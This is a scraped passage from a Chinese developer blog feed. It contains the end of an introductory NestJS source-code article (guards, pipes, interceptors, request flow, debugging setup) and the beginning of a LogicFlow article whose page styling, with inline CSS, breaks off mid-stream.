<h4 data-id="heading-13">5. 守卫 (Guard)</h4>
<p>权限控制：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthGuard</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CanActivate</span> {
  <span class="hljs-title function_">canActivate</span>(<span class="hljs-attr">context</span>: <span class="hljs-title class_">ExecutionContext</span>): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> request = context.<span class="hljs-title function_">switchToHttp</span>().<span class="hljs-title function_">getRequest</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">validateRequest</span>(request);
  }
}
</code></pre>
<h4 data-id="heading-14">6. 管道 (Pipe)</h4>
<p>数据转换和验证：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValidationPipe</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PipeTransform</span> {
  <span class="hljs-title function_">transform</span>(<span class="hljs-params">value: <span class="hljs-built_in">any</span>, metadata: ArgumentMetadata</span>) {
    <span class="hljs-keyword">return</span> value;
  }
}
</code></pre>
<h4 data-id="heading-15">7. 拦截器 (Interceptor)</h4>
<p>AOP 切面：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NestInterceptor</span> {
  <span class="hljs-title function_">intercept</span>(<span class="hljs-attr">context</span>: <span class="hljs-title class_">ExecutionContext</span>, <span class="hljs-attr">next</span>: <span class="hljs-title class_">CallHandler</span>): <span class="hljs-title class_">Observable</span>&lt;<span class="hljs-built_in">any</span>&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before...'</span>);
    <span class="hljs-keyword">return</span> next.<span class="hljs-title function_">handle</span>().<span class="hljs-title function_">pipe</span>(<span class="hljs-title function_">tap</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After...'</span>)));
  }
}
</code></pre>
<h3 data-id="heading-16">请求处理流程</h3>
<pre><code class="hljs language-scss" lang="scss">Request
   ↓
Middleware
   ↓
Guards
   ↓
Interceptors (before)
   ↓
Pipes
   ↓
Route Handler
   ↓
Interceptors (after)
   ↓
Exception Filters
   ↓
Response
</code></pre>
<h3 data-id="heading-17">系列文章</h3>
<p>本系列将深入分析 NestJS 源码：</p>
<ol>
<li><strong>项目介绍</strong>（本文）- 了解项目结构和核心概念</li>
<li><strong>架构总览</strong> - NestFactory 启动流程</li>
<li><strong>依赖注入</strong> - IoC 容器和 Injector 实现</li>
<li><strong>模块系统</strong> - Module 扫描和加载</li>
<li><strong>装饰器原理</strong> - 元数据存储机制</li>
<li><strong>路由系统</strong> - 请求分发和处理</li>
<li><strong>中间件机制</strong> - 中间件注册和执行</li>
<li><strong>AOP 实现</strong> - Guard、Pipe、Interceptor</li>
</ol>
<h3 data-id="heading-18">调试技巧</h3>
<h4 data-id="heading-19">1. 使用示例项目</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> sample/01-cats-app
npm install
npm run start:dev
</code></pre>
<h4 data-id="heading-20">2. 断点调试</h4>
<p>在 VS Code 中配置 launch.json：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"request"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"launch"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Debug Nest"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"runtimeArgs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"-r"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"ts-node/register"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"${workspaceFolder}/sample/01-cats-app/src/main.ts"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-21">3. 关键断点位置</h4>






























<table><thead><tr><th>场景</th><th>文件</th><th>函数</th></tr></thead><tbody><tr><td>应用创建</td><td><code>core/nest-factory.ts</code></td><td><code>create</code></td></tr><tr><td>模块扫描</td><td><code>core/scanner.ts</code></td><td><code>scan</code></td></tr><tr><td>依赖注入</td><td><code>core/injector/injector.ts</code></td><td><code>loadInstance</code></td></tr><tr><td>路由注册</td><td><code>core/router/router-explorer.ts</code></td><td><code>explore</code></td></tr></tbody></table>
<h3 data-id="heading-22">下一步</h3>
<p>环境准备好了，下一篇我们将分析 NestJS 的启动流程，看看 <code>NestFactory.create()</code> 背后发生了什么。</p>
<hr/>
<blockquote>
<p>📦 源码地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnestjs%2Fnest" target="_blank" title="https://github.com/nestjs/nest" ref="nofollow noopener noreferrer">github.com/nestjs/nest</a></p>
<p>下一篇：NestJS 架构总览</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LogicFlow 交互新体验：让锚点"活"起来，鼠标跟随动效实战！🧲]]></title>    <link>https://juejin.cn/post/7589107312112648201</link>    <guid>https://juejin.cn/post/7589107312112648201</guid>    <pubDate>2025-12-29T10:25:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589107312112648201" data-draft-id="7588799600166830090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LogicFlow 交互新体验：让锚点&quot;活&quot;起来，鼠标跟随动效实战！🧲"/> <meta itemprop="keywords" content="前端,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-12-29T10:25:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="橙某人"/> <meta itemprop="url" content="https://juejin.cn/user/1908407919184670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LogicFlow 交互新体验：让锚点"活"起来，鼠标跟随动效实战！🧲
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1908407919184670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    橙某人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:25:26.000Z" title="Mon Dec 29 2025 10:25:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa2louWolai3UqtE6qyWjoWgWNBYtl7aBdoJ2l/ZlmsE05jTetLXTGqb1TBvV1tP21+Zpl2k3avdqf9Gh6wTr5Ohs0mnWea